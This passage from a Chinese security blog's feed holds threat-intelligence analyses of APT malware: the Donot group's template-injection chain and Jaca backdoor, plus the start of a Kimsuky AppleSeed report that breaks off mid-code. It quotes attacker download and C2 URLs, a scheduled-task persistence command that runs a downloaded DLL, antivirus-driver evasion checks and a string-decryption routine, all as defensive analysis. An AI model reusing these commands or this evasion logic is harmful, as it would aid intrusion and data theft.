&lt;h1 id=&quot;3-详细分析&quot;&gt;&lt;a href=&quot;#3-详细分析&quot; class=&quot;headerlink&quot; title=&quot;3. 详细分析&quot;&gt;&lt;/a&gt;3. 详细分析&lt;/h1&gt;&lt;h2 id=&quot;1-ExcelDna-xll分析&quot;&gt;&lt;a href=&quot;#1-ExcelDna-xll分析&quot; class=&quot;headerlink&quot; title=&quot;1. ExcelDna.xll分析&quot;&gt;&lt;/a&gt;1. ExcelDna.xll分析&lt;/h2&gt;&lt;p&gt; &amp;emsp;&amp;emsp;XLL插件是Excel文件的扩展，实际上只是一个普通的dll文件。Excel对其xll插件创建了关联，使其能够双击运行。&lt;br&gt; &amp;emsp;&amp;emsp;XLL插件显示的图标与其他Excel文件显示的图标非常相似, 普通用户不会注意到XLL与其他Excel文件之间的任何区别，并且可以被诱导打开。&lt;/p&gt;
&lt;img src=&quot;/post/1364ae67/clip_image001.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>DoNot组织在其框架中引入浏览器窃取模块</title>
    <link href="http://shxi.cc/post/e42690c0.html"/>
    <id>http://shxi.cc/post/e42690c0.html</id>
    <published>2022-08-26T03:15:11.000Z</published>
    <updated>2023-11-01T06:46:29.292Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.   概述"></a>1.   概述</h1><p>&emsp;&emsp;Donot“肚脑虫”（APT-Q-38）是疑似具有南亚背景的APT组织，其主要以周边国家的政府机构 为目标进行网络攻击活动，通常以窃取敏感信息为目的。该组织具备针对Windows与Android双平台的攻击能力。<br>&emsp;&emsp;在对该组织追踪朔源的过程中，发现Donot使用了一系列新型的后门框架，该框架名为Jaca，根据组件的功能分别分为下载执行组件、文件上传组件、截图组件、文件收集组件、键盘鼠标消息记录组件、浏览器敏感信息窃取组件、移动磁盘文件收集组件等等。</p><h1 id="2-样本详情"><a href="#2-样本详情" class="headerlink" title="2. 样本详情"></a>2. 样本详情</h1><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>文件名</td><td>S03.doc</td></tr><tr><td>MD5</td><td>3fabf3b97362af460abe98855c7caef8</td></tr><tr><td>文件类型</td><td>Office word文档</td></tr></tbody></table><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>文件名</td><td>HG5HlDPqsnr3HBwO.php</td></tr><tr><td>Md5</td><td>21b82530fa520eecd5aa677fa7ec0879</td></tr><tr><td>文件类型</td><td>Office word模板</td></tr></tbody></table><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>文件名</td><td>pgixedfxglmjirdc.dll</td></tr><tr><td>Md5</td><td>b38586849d45649db67189c1e7c0397e</td></tr><tr><td>文件类型</td><td>dll</td></tr></tbody></table><h1 id="3-流程图"><a href="#3-流程图" class="headerlink" title="3.   流程图"></a>3.   流程图</h1> <img src="/post/e42690c0/clip_image001.png" class="" title="example"><span id="more"></span><h1 id="4-详细分析"><a href="#4-详细分析" class="headerlink" title="4. 详细分析"></a>4. 详细分析</h1><h2 id="1-s003-doc分析"><a href="#1-s003-doc分析" class="headerlink" title="1. s003.doc分析"></a>1. s003.doc分析</h2><p>&emsp;&emsp;该样本使用远程RTF模板注入，在RTF的template数据中插入要加载的模板文件,模板文件地址为:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>necromencertwo.buzz<span class="regexp">/bfrp31KqURS2yZTE/</span><span class="number">0</span>BmHwYTEgupY2Qfb.php</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如下图所示:<br><img src="e42690c0/clip_image003.png"></p><p>&emsp;&emsp;托管模板文件的服务器会判断是否由office文档发送请求，如果不是则返回诱饵文档，否则返回携带恶意宏代码的文档。<br>&emsp;&emsp;模板文件的元数据如下, 元数据中与个人有关的元数据已经被清除, 使分析人员不能通过元数据获取到有用的信息。<br><img src="e42690c0/clip_image005.png"></p><p>&emsp;&emsp;从元数据中的数据可以推测出如下几点:</p><ol><li><p>   模板文件创建时间为2021年3月30日,最近的修改时间为2022年6月6号，可以得知至少在2021年3月份Donot组织就开始在使用远程RTF模板注入，并且是用工具对同一个文件来生成的包含不同恶意宏代码的文件。</p></li><li><p>   Donot生成模板文件时使用的操作系统为win10-x64,使用的office word的版本为15.000。  </p></li></ol><h3 id="1-1-宏代码"><a href="#1-1-宏代码" class="headerlink" title="1.1  宏代码"></a>1.1  宏代码</h3><p>&emsp;&emsp;当模板注入成功时，它会诱使受害者开启宏功能以使恶意宏代码能够执行。宏被启用后调用dOCument_OpEN方法，dOCument_OpEN主要功能是拼接shellcode，调用ZwAllocateVirtualMemory在当前进程(word.exe)的内存空间分配内存存放shellcode并设置可执行属性；调用MultiByteToWideChar将shellcode从字节转换成utf-16;将转换后的shellcode作为回调参数传入函数EnumUILanguagesA中。<br><img src="e42690c0/clip_image007.png"></p><p>&emsp;&emsp;打开带有恶意宏代码的word程序有x86和x64版本两个版本,在宏代码中利用宏定义Win64来识别并在EnumUILanguagesA中使用不同版本的shellcode。<br><img src="e42690c0/clip_image009.png"></p><h3 id="1-2-Stage1-x64-shellcode"><a href="#1-2-Stage1-x64-shellcode" class="headerlink" title="1.2 Stage1 x64 shellcode"></a>1.2 Stage1 x64 shellcode</h3><p>&emsp;&emsp;X86和x64版本的shellcode大致一样, 不同的是获取PEB结构地址的方法和 在获取已加载的模块时使用的结构体偏移不一致。<br><img src="e42690c0/clip_image011.png"></p><p>&emsp;&emsp;通过PEB来查找kernel32.dll的加载地址<br><img src="e42690c0/clip_image013.png"></p><p>&emsp;&emsp;获取Dll函数加载地址和函数地址时并不使用明文来获取，而是在恶意程序内部硬编码了几个函数名对应的哈希值。寄存器 rsi为要查找的API地址所在的dll的加载基址,通过加载地址解析模块的导出表并计算哈希值，要查找的API都是以硬编码哈希的形式存放在程序内，该哈希值先异或0xBAADC0D3再与计算出的哈希值进行比较，如果相等则返回对应API的函数地址,否则继续比较直到找到为止。</p><p><img src="e42690c0/clip_image015.png"></p><p>&emsp;&emsp;解析以下函数地址用于保存下载的文件和分配内存<br><img src="e42690c0/clip_image017.png"></p><p>&emsp;&emsp;从服务器下载加密的shellcode并保存到临时文件，由于服务器已经无法连接，不能继续分析下一阶段的shellcode。<br><img src="e42690c0/clip_image019.png"></p><p>&emsp;&emsp;解密加密的shellcode并跳转到shellcode执行代码。<br><img src="e42690c0/clip_image021.png"></p><p>&emsp;&emsp;在shellcode中发现一些有趣的字符串，这些信息是用于第二阶段的shellcode用于解密的xor密钥和一些安全产品到期时间等等。</p><p><img src="e42690c0/clip_image023.png"></p><h3 id="a-Stage1-x86-shellcode"><a href="#a-Stage1-x86-shellcode" class="headerlink" title="a) Stage1 x86 shellcode"></a>a) Stage1 x86 shellcode</h3><p>&emsp;&emsp;这一阶段的shellcode与x64版本的shellcode一样,开头代码为解密后续的加密数据,解密算法为对加密数据的每一个字节先取反然后异或0x2B,大小为0x29A。</p><p><img src="e42690c0/clip_image025.png"></p><p>&emsp;&emsp;与x64版本的shellcode一样, 通过是遍历peb的链表InLoadOrderModuleList指向的模块相关的数据结构来获取kernel32.dll的加载地址。</p><p><img src="e42690c0/clip_image027.png"></p><p>&emsp;&emsp;通过比较函数哈希来获取函数地址的方法与x64版本一样。</p><p><img src="e42690c0/clip_image029.png"></p><p>&emsp;&emsp;解密该阶段和下阶段shellcode要使用的API函数地址。</p><p><img src="e42690c0/clip_image031.png"></p><p>&emsp;&emsp;从服务器上下载加密的shellcode,  x64 shellcode下载是png后缀的文件,x86下载的是ico后缀文件。</p><p><img src="e42690c0/clip_image033.png"></p><p>&emsp;&emsp;异或解密后服务器上下载的shellcode, 然后判断解密的shellcode的入口点是否为0x89、0x90、0xcc, 如果是则表示已经解密成功，跳转到shellcode入口点执行代码，如果不是则从shellcode返回到进程word而不执行任何恶意代码。</p><p><img src="e42690c0/clip_image035.png">        </p><h3 id="1-4-Stage2-x86-shellcode"><a href="#1-4-Stage2-x86-shellcode" class="headerlink" title="1.4 Stage2 x86 shellcode"></a>1.4 Stage2 x86 shellcode</h3><p>&emsp;&emsp;该阶段的shellcode入口代码和前面的shellcode一样，先解密加密数据然后跳转到解密后的代码执行。<br><img src="e42690c0/clip_image037.png"></p><p>&emsp;&emsp;解析shellcode用到的API地址, 解析方法与前面shellcode与前面的shellcode使用的方法一样。<br><img src="e42690c0/clip_image039.png"></p><p>&emsp;&emsp;在这一阶段shellcode中,寄存器EDI指向的内存使用的结构体如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">format</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> kernel32_VirtualAlloc;</span><br><span class="line">…<span class="comment">//省略部分字段均为API的函数地址</span></span><br><span class="line"><span class="type">int</span> urlmon_URLDownloadToFileA;</span><br><span class="line">  <span class="type">char</span> unkonw_data[<span class="number">296</span>];</span><br><span class="line">  <span class="type">char</span> syswow64_path[<span class="number">256</span>]; <span class="comment">//字符串%tmp%\syswow64.dll</span></span><br><span class="line">  <span class="type">char</span> doc_path[<span class="number">256</span>];<span class="comment">//文档路径 &#x27;%tmp%\document.doc</span></span><br><span class="line">  <span class="type">char</span> cmd1[<span class="number">256</span>];</span><br><span class="line">  <span class="type">int</span> klif_exits;<span class="comment">//klif.sys是否存在</span></span><br><span class="line">  <span class="type">char</span> klif_flag;<span class="comment">// klif.sys文件的过期标志</span></span><br><span class="line">  <span class="type">int</span> aswsp_exits;<span class="comment">// aswsp.sys是否存在</span></span><br><span class="line">  <span class="type">char</span> aswsp_flag;<span class="comment">// aswsp.sys文件的过期标志</span></span><br><span class="line">  <span class="type">int</span> bsfs_exits;<span class="comment">// bsfs.sys是否存在</span></span><br><span class="line">  <span class="type">char</span> bsfs_flag;<span class="comment">//bsfs.sys的过期标志</span></span><br><span class="line">  <span class="type">int</span> gzflt_exits;<span class="comment">// gzflt.sys是否存在</span></span><br><span class="line">  <span class="type">char</span> gzflt_flag;<span class="comment">//gzflt.sys的过期标志</span></span><br><span class="line">  <span class="type">int</span> ehdrv_exits;<span class="comment">// ehdrv.sys是否存在</span></span><br><span class="line">  <span class="type">char</span> ehdrv_flag;<span class="comment">//ehdrv.sys的过期标志</span></span><br><span class="line">  <span class="type">int</span> _360AvFlt_exits;<span class="comment">// 360AvFlt.sys是否存在</span></span><br><span class="line">  <span class="type">char</span> _360AvFlt_flag;<span class="comment">// 360AvFlt.sys的过期标志</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;Shellcode会检测以下文件是否存在, 并使用结构体的两个字段来分别表示文件是否存在或者是否已经过期。比如用字段bsfs_exits来标志basfs.sys是否存在,bsfs_flag来判断是否过期。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klif<span class="selector-class">.sys</span> aswsp<span class="selector-class">.sys</span> bsfs<span class="selector-class">.sys</span> gzflt<span class="selector-class">.sys</span> ehdrv<span class="selector-class">.sys</span> <span class="number">360</span>AvFlt.sys</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;以aswsp.sys为例, 该文件不存在时字段bsfs_exits值设为0, 将本地时间与预设的过期时间相比较，小于等于过期时间时字段aswsp_flag设置为1,否则为2。</p><p><img src="e42690c0/clip_image039.png"></p><p>&emsp;&emsp;如果文件存在, 则根据flag的值来执行不同的行为, 在这个行为中使用以下这些值, 分别用[1]-[7]来表示。</p><p>[1] hxxp://mak.logupdates.xyz/DWqYVVzQLc0xrqvt/HG5HlDPqsnr3HBwOKY0vKGRBE7V0sDPdZb09n7xhp0klyT5X.mp3<br>[2] hxxp://mak.logupdates.xyz/DWqYVVzQLc0xrqvt/HG5HlDPqsnr3HBwOKY0vKGRBE7V0sDPdZb09n7xhp0klyT5X.doc<br>[3] %tmp%\syswow64.dll<br>[4] %tmp%\document.doc<br>[5] Qoltyfotskelo<br>[6] schtasks.exe /create /tn wakeup /tr &quot;rundll32 %tmp%\syswow64.dll, HPMG&quot; /f /sc DAILY /st 11:00 /ri 10 /du 24:00、<br>[7] cmd.exe %tmp%\syswow64.dll</p><p>&emsp;&emsp;下表为如果驱动文件存在时shellcode要执行的动作:</p><table><thead><tr><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>驱动名</td><td>所属安全软件</td><td>到期时间</td><td>Flag为1(未过期)</td><td>Flag为2(已过期)</td></tr><tr><td>gzflt.sys</td><td>BitDefender</td><td>2022.07.15</td><td>参考1.5</td><td>参考1.6</td></tr><tr><td>klif.sys</td><td>卡巴斯基</td><td>2022.07.11</td><td>参考1.7</td><td>解密shellcode,后面与节1.6一样</td></tr><tr><td>aswsp.sys</td><td>Avast</td><td>2022.07.15</td><td>参考1.5</td><td>参考1.6</td></tr><tr><td>ehdrv.sys</td><td>ESET NOD32</td><td>2022.07.23</td><td>参考1.5</td><td>参考1.6</td></tr><tr><td>bsfs.sys</td><td>QuickHeal</td><td>2022.07.17</td><td>参考1.5</td><td>返回到进程word</td></tr><tr><td>360AvFlt.sys</td><td>奇虎360</td><td>2022.07.19</td><td>参考1.5</td><td>参考1.6</td></tr></tbody></table><h3 id="1-5-下载文件并调用导出函数"><a href="#1-5-下载文件并调用导出函数" class="headerlink" title="1.5 下载文件并调用导出函数"></a>1.5 下载文件并调用导出函数</h3><p>&emsp;&emsp;从连接[1]下载文件并保存到[3]，下载的文件头部的PE结构magic值被抹除，这是为了绕过反病毒软件的检测。恢复文件头部然后加载文件并调用其导出函数[5]</p><p><img src="e42690c0/clip_image043.png"></p><h3 id="1-6-通过WinExcute执行程序"><a href="#1-6-通过WinExcute执行程序" class="headerlink" title="1.6 通过WinExcute执行程序"></a>1.6 通过WinExcute执行程序</h3><p>&emsp;&emsp;从连接[1]下载文件并保存到路径[3],从连接[2]下载诱饵文档保存到路径[5],然后拼接创建计划任务时需要的命令行[6]，使用函数WinExec来执行命令。</p><p><img src="e42690c0/clip_image045.png"></p><h3 id="1-7-注入shellcode到bcrypt-dll并执行"><a href="#1-7-注入shellcode到bcrypt-dll并执行" class="headerlink" title="1.7 注入shellcode到bcrypt.dll并执行"></a>1.7 注入shellcode到bcrypt.dll并执行</h3><p>&emsp;&emsp;将另一段shellcode注入到模块bcrypt.dll的内存空间内, 修改内存属性为可执行然后执行注入的shellcode。<br><img src="e42690c0/clip_image047.png"></p><p>&emsp;&emsp;注入的代码如下, 也是从连接[1]下载文件保存到[3],然后执行dll的导出函数。<br><img src="e42690c0/clip_image049.png"></p><h2 id="2-syswow64-dll分析"><a href="#2-syswow64-dll分析" class="headerlink" title="2. syswow64.dll分析"></a>2. syswow64.dll分析</h2><p>&emsp;&emsp;该文件包含两个导出函数Yolueorgw和Qoltyfotskelo。第一个导出函数主要是检测防病毒软件和检测是否在虚拟机内执行。第二个导出函数为设置计划任务。</p><h3 id="1-检测互斥量和虚拟机环境"><a href="#1-检测互斥量和虚拟机环境" class="headerlink" title="1.     检测互斥量和虚拟机环境"></a>1.     检测互斥量和虚拟机环境</h3><p>&emsp;&emsp;创建名为”KRDNVCEAMGT@LJHNKED”的互斥量, 如果恶意程序已经在运行中则退出程序。通过WMI来查询产品名来判断是否处于虚拟机环境中，如果处于虚拟机环境中则退出程序。</p><p><img src="e42690c0/clip_image051.png"></p><h3 id="2-检测是否安装安全软件"><a href="#2-检测是否安装安全软件" class="headerlink" title="2.     检测是否安装安全软件"></a>2.     检测是否安装安全软件</h3><p>&emsp;&emsp;恶意程序检测目标机器上是否由安装360TotalSecurity，如果有则将自删除代码写入脚本并执行。</p><p><img src="e42690c0/clip_image053.png"></p><p>&emsp;&emsp;自删除代码如下,bat使用了5个参数, 通过taskkill结束自身进程,调用del删除自身文件，调用schtasks来删除名为DrivealoneUpdates的计划任务。</p><p><img src="e42690c0/clip_image055.png"></p><h3 id="3-收集信息"><a href="#3-收集信息" class="headerlink" title="3.     收集信息"></a>3.     收集信息</h3><p>&emsp;&emsp;收集受害者用户名、机器名和处理器ID信息。<br><img src="e42690c0/clip_image057.png"></p><p>&emsp;&emsp;收集目录” C:\Program Files”和” C:\Program Files(x86)”下所有的文件夹,并用字符”?”来分隔。<br><img src="e42690c0/clip_image059.png"></p><p>&emsp;&emsp;最终将所有收集到的数据拼接在一起并加密上传到C&amp;C服务器，使用的加密方法为AES256+Base64，通过post方法将加密后的值作为字段batac的值发送到C&amp;C服务器</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rus.feedpolicy.xyz/<span class="symbol">Nb438</span>e<span class="number">8</span>pcbar<span class="number">5</span>ky<span class="number">245</span><span class="symbol">ntr4</span>um/tk<span class="number">5</span>hyeq<span class="number">9</span>pgdt</span><br></pre></td></tr></table></figure><p><img src="e42690c0/clip_image061.png"></p><h3 id="3-检测网络是否有效"><a href="#3-检测网络是否有效" class="headerlink" title="3. 检测网络是否有效"></a>3. 检测网络是否有效</h3><p>&emsp;&emsp;恶意程序往地址en.wikipedia.org/wiki/Encyclopedia发送数据包来检测受害者机器的网络是否有效。<br><img src="e42690c0/clip_image063.png"></p><p>&emsp;&emsp;网络有效则在目录”c:\ProgramData”下创建文件”yjzsghu.txt”并写入数据” BQO89GHY7ki”来标识网络处于连通状态。<br><img src="e42690c0/clip_image065.png"></p><h3 id="4-创建计划任务"><a href="#4-创建计划任务" class="headerlink" title="4.     创建计划任务"></a>4.     创建计划任务</h3><p>&emsp;&emsp;创建定时的计划任务，每隔3分钟执行一次程序，执行的程序和命令行如下:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ru<span class="symbol">ndll32</span>.exe <span class="meta">%</span>Temp<span class="meta">%</span>\pgixedfxglmjirdc.dll,Yolueorgw</span><br></pre></td></tr></table></figure><p><img src="e42690c0/clip_image067.png"></p><h3 id="4-删除计划任务"><a href="#4-删除计划任务" class="headerlink" title="4. 删除计划任务"></a>4. 删除计划任务</h3><p>&emsp;&emsp;调用程序schtasks来删除名为Jiscor的计划任务。<br><img src="e42690c0/clip_image069.png"></p><h3 id="5-C-amp-C指令"><a href="#5-C-amp-C指令" class="headerlink" title="5. C&amp;C指令"></a>5. C&amp;C指令</h3><p>&emsp;&emsp;如果由C&amp;C服务器返回的指令中包含”Lok”时恶意程序发送数据到C&amp;C服务器请求下载文件, 发送的格式如下, 与上传泄露信息时使用相同的加密方法。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名-机器名-处理器ID<span class="string">|||dll名</span></span><br></pre></td></tr></table></figure><p><img src="e42690c0/clip_image071.png"></p><p>&emsp;&emsp;下载的模块保存于目录%pragramData%/DeviceStage下。<br><img src="e42690c0/clip_image073.png"></p><p>&emsp;&emsp;由于C&amp;C服务器已经关闭,无法接收到后续的指令，因此无法继续分析下去。</p><h1 id="5-IOC"><a href="#5-IOC" class="headerlink" title="5.   IOC"></a>5.   IOC</h1><p>3fabf3b97362af460abe98855c7caef8<br>21b82530fa520eecd5aa677fa7ec0879<br>b38586849d45649db67189c1e7c0397e<br>yjzsghu.txt<br>hxxp://necromencertwo.buzz/bfrp31KqURS2yZTE/0BmHwYTEgupY2Qfb.php</p><h1 id="6-ATT-amp-CK矩阵"><a href="#6-ATT-amp-CK矩阵" class="headerlink" title="6. ATT&amp;CK矩阵"></a>6. ATT&amp;CK矩阵</h1><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Tactic</td><td>ID</td><td>Name</td><td>Description</td></tr><tr><td>initial-access</td><td>Phishing</td><td>T1566</td><td>通过网络钓鱼投递</td></tr><tr><td>execution</td><td>Command and Scripting Interpreter</td><td>T1059</td><td>使用bat脚本自删除</td></tr><tr><td></td><td>Scheduled Task/Job</td><td>T1053</td><td>设置计划任务来定时执行程序</td></tr><tr><td>defense-evasion</td><td>Template Injection</td><td>T1221</td><td>Office文档使用模板注入</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.   概述&quot;&gt;&lt;/a&gt;1.   概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;Donot“肚脑虫”（APT-Q-38）是疑似具有南亚背景的APT组织，其主要以周边国家的政府机构 为目标进行网络攻击活动，通常以窃取敏感信息为目的。该组织具备针对Windows与Android双平台的攻击能力。&lt;br&gt;&amp;emsp;&amp;emsp;在对该组织追踪朔源的过程中，发现Donot使用了一系列新型的后门框架，该框架名为Jaca，根据组件的功能分别分为下载执行组件、文件上传组件、截图组件、文件收集组件、键盘鼠标消息记录组件、浏览器敏感信息窃取组件、移动磁盘文件收集组件等等。&lt;/p&gt;
&lt;h1 id=&quot;2-样本详情&quot;&gt;&lt;a href=&quot;#2-样本详情&quot; class=&quot;headerlink&quot; title=&quot;2. 样本详情&quot;&gt;&lt;/a&gt;2. 样本详情&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;文件名&lt;/td&gt;
&lt;td&gt;S03.doc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MD5&lt;/td&gt;
&lt;td&gt;3fabf3b97362af460abe98855c7caef8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;文件类型&lt;/td&gt;
&lt;td&gt;Office word文档&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;文件名&lt;/td&gt;
&lt;td&gt;HG5HlDPqsnr3HBwO.php&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Md5&lt;/td&gt;
&lt;td&gt;21b82530fa520eecd5aa677fa7ec0879&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;文件类型&lt;/td&gt;
&lt;td&gt;Office word模板&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;文件名&lt;/td&gt;
&lt;td&gt;pgixedfxglmjirdc.dll&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Md5&lt;/td&gt;
&lt;td&gt;b38586849d45649db67189c1e7c0397e&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;文件类型&lt;/td&gt;
&lt;td&gt;dll&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;3-流程图&quot;&gt;&lt;a href=&quot;#3-流程图&quot; class=&quot;headerlink&quot; title=&quot;3.   流程图&quot;&gt;&lt;/a&gt;3.   流程图&lt;/h1&gt; &lt;img src=&quot;/post/e42690c0/clip_image001.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    <category term="APT分析报告" scheme="http://shxi.cc/categories/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    
    
    <category term="Donot" scheme="http://shxi.cc/tags/Donot/"/>
    
  </entry>
  
  <entry>
    <title>Kimsuky APT继续使用AppleSeed后门攻击韩国政府</title>
    <link href="http://shxi.cc/post/e22d03da.html"/>
    <id>http://shxi.cc/post/e22d03da.html</id>
    <published>2022-07-15T04:40:12.000Z</published>
    <updated>2024-03-31T04:52:24.611Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;Kimsuky 是位于朝鲜的APT组织,又名(Mystery Baby, Baby Coin, Smoke Screen,BabyShark, Cobra Venom)等，最早由Kaspersky在2013年披露。<br>&emsp;&emsp;该组织长期针对于韩国的智囊团、政府外交、新闻组织、教育学术组织等进行攻击，在过去几年里，他们将攻击目标扩大到包括美国、俄罗斯和欧洲各国在内的国家。主要目的为窃取情报、间谍活动等。<br>&emsp;&emsp;Kimsuky使用各种鱼叉式网络钓鱼和社会工程方法来获取对受害者网络的初始访问权限。</p><h1 id="2-样本详情"><a href="#2-样本详情" class="headerlink" title="2. 样本详情"></a>2. 样本详情</h1><table><thead><tr><th>文件名</th><th>ESTCommon.dll</th></tr></thead><tbody><tr><td>Md5</td><td>6844589e2962b3914824cc8b90a552a6</td></tr><tr><td>文件类型</td><td>Dll x64</td></tr></tbody></table><h1 id="4-详细分析"><a href="#4-详细分析" class="headerlink" title="4. 详细分析"></a>4. 详细分析</h1><h2 id="1-字符串解密"><a href="#1-字符串解密" class="headerlink" title="1.字符串解密"></a>1.字符串解密</h2><p>&emsp;&emsp;恶意程序将所有可见的字符串和重要的API使用自定义的加密算法进行加密，加密后的数据以十六进制的ANSII格式存放,当需要使用时调用解密函数进行解密。如下图:</p><img src="/post/e22d03da/d12b734d856919c9b7fc852e9d225e77.png" class="" title="example"><span id="more"></span><p>首先将加密数据转换成十六进制,然后取前16个字节为异或key,剩余的数据为已加密的字符串。 解密算法如下,当i为0时,string[i-1]为0。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key<span class="selector-attr">[i]</span> ^ string<span class="selector-attr">[i-1]</span> ^ string<span class="selector-attr">[i]</span></span><br></pre></td></tr></table></figure><p>以上图中的加密数据为例,解密过程如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">异或Key为: 5a a6 <span class="number">54</span> <span class="number">15</span> c2 fc <span class="number">1b</span> e5 <span class="number">25</span> <span class="number">29</span> <span class="number">0b</span> <span class="number">29</span> <span class="number">23</span> <span class="number">75</span> <span class="number">89</span> 4b</span><br><span class="line">加密字符为: <span class="number">31</span> f2 d4 af <span class="number">08</span> <span class="number">98</span> b0 <span class="number">67</span> 6c <span class="number">21</span> <span class="number">46</span> <span class="number">03</span></span><br><span class="line">依次异或解密:</span><br><span class="line"><span class="number">0x5a</span> ^ <span class="number">0x00</span> ^ <span class="number">0x31</span> = ‘k’</span><br><span class="line"><span class="number">0xa6</span> ^ <span class="number">0x31</span> ^ <span class="number">0xf2</span> = ‘e’</span><br><span class="line"><span class="number">0x54</span> ^ <span class="number">0xf2</span> ^ <span class="number">0xd4</span> = ‘r’</span><br><span class="line"><span class="number">0x15</span> ^ <span class="number">0xd4</span> ^ <span class="number">0xaf</span> = ‘n’</span><br><span class="line"><span class="number">0xc2</span> ^ <span class="number">0xaf</span> ^ <span class="number">0x08</span> = ‘e’</span><br><span class="line"><span class="number">0xfc</span> ^ <span class="number">0x08</span> ^ <span class="number">0x98</span> = ‘l’</span><br><span class="line"><span class="number">0x1b</span> ^ <span class="number">0x98</span> ^ <span class="number">0xb0</span> = ‘<span class="number">3</span>’</span><br><span class="line"><span class="number">0xe5</span> ^ <span class="number">0xb0</span> ^ <span class="number">0x67</span> = ‘<span class="number">2</span>’</span><br><span class="line"><span class="number">0x25</span> ^ <span class="number">0x67</span> ^ <span class="number">0x6c</span> = ‘.’</span><br><span class="line"><span class="number">0x29</span> ^ <span class="number">0x6c</span> ^ <span class="number">0x21</span> = ‘d’</span><br><span class="line"><span class="number">0x0b</span> ^ <span class="number">0x21</span> ^ <span class="number">0x46</span> = ‘l’</span><br><span class="line"><span class="number">0x29</span> ^ <span class="number">0x46</span> ^ <span class="number">0x03</span> = ‘l’</span><br><span class="line">最后解密出字符串”kernel32<span class="number">.</span>dll”</span><br></pre></td></tr></table></figure><p>用python脚本编写的解密代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">s</span>):</span><br><span class="line">    s_bytes = <span class="built_in">bytes</span>.fromhex(s)</span><br><span class="line">    key = s_bytes[<span 